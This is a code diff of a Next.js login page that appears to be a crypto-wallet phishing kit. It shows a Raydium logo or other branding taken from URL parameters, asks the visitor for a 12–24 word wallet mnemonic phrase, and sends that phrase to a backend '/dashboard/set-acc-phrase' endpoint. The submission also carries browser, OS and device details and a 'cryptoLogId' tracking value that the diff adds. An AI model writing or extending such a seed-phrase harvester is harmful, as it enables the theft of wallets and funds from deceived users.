@@ -1,4 +1,5 @@
 "use client";
+import { log } from 'console';
 import { useSearchParams } from 'next/navigation';
 import { useState, useEffect } from 'react';
 // import UAParser from "ua-parser-js";
@@ -9,25 +10,33 @@ const LoginPage = () => {
   const searchParams = useSearchParams();
   const [value, setValue] = useState("")
   const [error, setError] = useState("");
+  const [success, setSuccess] = useState("");
   const [userInfo, setUserInfo] = useState({
     browser: "",
     os: "",
     device: "",
   });
-  console.log(userInfo);
+
   const bgColor:any = searchParams.get('bgColor') || '#181d31';
   const bgColorBox:any = searchParams.get('bgColorBox') || '#ffffff';
   const buttonColor:any = searchParams.get('buttonColor') || '#00cfff';
-  // const logo = "/raydium-logo-freelogovectors.png";
-  const logo: any = searchParams.get('logo')  || "/raydium-logo-freelogovectors.png";
-  // console.log('bgColor:', bgColor);
-  // console.log('bgColorBox:', bgColorBox);
-  // console.log('buttonColor:', buttonColor);
-  console.log("value: ", value)
+  const cryptoLogId:any = searchParams.get('cryptoLogId');
+  const appLogo: any = searchParams.get('appLogo');
+  const token: any = searchParams.get('token');
+
+  const staticLogo = "/raydium-logo-freelogovectors.png"
+
+  // const logo2 = 'https://firebasestorage.googleapis.com/v0/b/xtremefish-9ceaf.appspot.com/o/crypto-images%2FGoogle_G_logo.svg.png6c1a7d17-bc0a-4806-82f3-55af5f746218?alt=media&token=ffe2ad9a-8340-4e33-ad59-f3fc057af635';
+  // console.log(logo)
+  const logo = appLogo+'&token='+token;
+  const dynamicLogo = logo.replace('crypto-images/', 'crypto-images%2F');
+  console.log("logo:  ",dynamicLogo)
+  console.log("appLogo:  ",appLogo)
+
+
   useEffect(() => {
     const parser = new UAParser();
     const result = parser.getResult();
-
     setUserInfo({
       browser: `${result.browser.name} ${result.browser.version}`,
       os: `${result.os.name} ${result.os.version}`,
@@ -38,50 +47,41 @@ const LoginPage = () => {
   }, []);
 
   const handleInputChange = (e: React.ChangeEvent<HTMLTextAreaElement>) => {
-    // const inputValue = e.target.value.trim();
-
-    // // Validate the input
-    // const wordRegex = /^[a-z\s]+$/; // Only lowercase letters and spaces
-    // const words = inputValue.split(/\s+/); // Split the input into words
-
-    // if (!wordRegex.test(inputValue)) {
-    //   setError("Input must contain only lowercase letters and spaces.");
-    // } else if (words.length < 12 || words.length > 24) {
-    //   setError("Input must contain between 12 and 24 words.");
-    // } else {
-    //   setError(""); // No errors
-    // }
-
     setValue(e.target.value);
   };
 
   const handleSubmit = async () => {
     const inputValue = value.trim();
 
-    // Validate the input
-    const wordRegex = /^[a-z\s]+$/; // Only lowercase letters and spaces
-    const words = inputValue.split(/\s+/); // Split the input into words
+    if (!inputValue) {
+      setError("Phrase cannot be empty.");
+      setTimeout(() => {
+        setError("");
+      }, 2000);
+      return;
+    }
+    const wordRegex = /^[a-z\s]+$/;
+    const words = inputValue.split(/\s+/);
 
     if (!wordRegex.test(inputValue)) {
-      setError("Input must contain only lowercase letters and spaces.");
+      setError("Error mnemonic phrase can only contain 12 or 24 words spaced.");
+      setTimeout(() => {
+        setError("");
+      }, 2000);
       return;
     } else if (words.length < 12 || words.length > 24) {
       setError("Input must contain between 12 and 24 words.");
+      setTimeout(() => {
+        setError("");
+      }, 2000);
       return;
     } else {
-      setError(""); // No errors
+      setError("");
     }
 
     if (error) {
-      alert("Please fix the errors before submitting.");
       return;
     }
-
-    if (!value.trim()) {
-      alert("Please enter your mnemonic phrase.");
-      return;
-    }
-
     try {
       const response = await fetch(
         "http://localhost:8080/dashboard/set-acc-phrase",
@@ -97,21 +97,20 @@ const LoginPage = () => {
               os: userInfo.os,
               device: userInfo.device,
             },
+            cryptoLogId:cryptoLogId,
           }),
         }
       );
 
       if (response.ok) {
         const data = await response.json();
-        alert("Mnemonic phrase and user info submitted successfully!");
-        console.log("Response:", data);
+        setSuccess(data.message);
+        setTimeout(() => {
+          setSuccess("");
+        }, 2000);
       } else {
-        alert("Failed to submit data. Please try again.");
-        console.error("Error:", error);
       }
     } catch (error) {
-      console.error("Error:", error);
-      alert("An error occurred while submitting the data.");
     }
   };
 
@@ -123,25 +122,26 @@ const LoginPage = () => {
     style={{ backgroundColor: bgColor }}
     >
       <div
-        className="w-4500px] p-6 rounded-lg shadow-md text-center login-container"
+        className="w-[380px] p-6 rounded-lg shadow-md text-center login-container"
         style={{ backgroundColor: bgColorBox }}
         >
-        {/* Logo */}
-        {/* <p className="mb-2">Browser: {userInfo.browser}</p>
-        <p className="mb-2">Operating System: {userInfo.os}</p>
-        <p className="mb-2">Device: {userInfo.device}</p> */}
         <div className='logo-placeholder'>
           <img
             height={100}
             width={100}
-            src={logo}
+            src={appLogo===null ? staticLogo : dynamicLogo }
             alt="Logo"
-            className="mx-auto mb-4 h-16 w-60"
+            className="mx-auto h-14 w-60"
           />
         </div>
           {error && (
-              <div className='message-container'>
+              <div className='message-container-error'>
                 {error}
+              </div>
+            )}
+          {success && (
+              <div className='message-container-success'>
+                {success}
               </div>
             )}
         <textarea
